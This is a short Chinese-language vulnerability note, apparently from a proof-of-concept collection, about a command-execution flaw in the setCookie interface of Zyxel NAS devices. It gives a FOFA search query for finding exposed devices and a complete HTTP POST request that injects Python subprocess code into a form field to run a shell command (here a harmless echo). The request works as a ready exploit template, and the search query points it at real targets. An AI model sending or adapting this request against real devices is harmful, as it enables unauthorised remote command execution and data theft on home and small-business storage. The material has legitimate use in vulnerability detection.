**fofa**

```
body="'res/i18n/nls/"
```

**一、漏洞简述**

Zyxel-NAS是一款出色的网络附加存储设备,为家庭和中小企业用户提供高性能、高可靠性的数据存储解决方案。其支持灵活的RAID配置,可为用户提供强大的数据冗余和扩展能力。内置的多媒体服务器功能,让用户能够轻松共享和管理照片、音乐、视频等文件。此外,Zyxel-NAS还提供了远程访问和自动备份等贴心功能,帮助用户随时随地管理和保护重要数据。凭借其出色的性能、丰富的功能和节能设计,Zyxel-NAS无疑是家庭和中小企业数据存储的优质选择。无论您是需要大容量的数据存储、还是希望享受多媒体分享的便利,Zyxel-NAS都能满足您的各项需求。其接口setcokie存在命令执行漏洞，攻击者可通过该漏洞获取系统命令权限。

**二、漏洞检测poc**

```yaml
POST /cmd,/simZysh/register_main/setCookie HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
Content-Length: 240

------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="c0"

storage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("echo HelloWorldTest", shell=True)#
------WebKitFormBoundarygcflwtei--
```

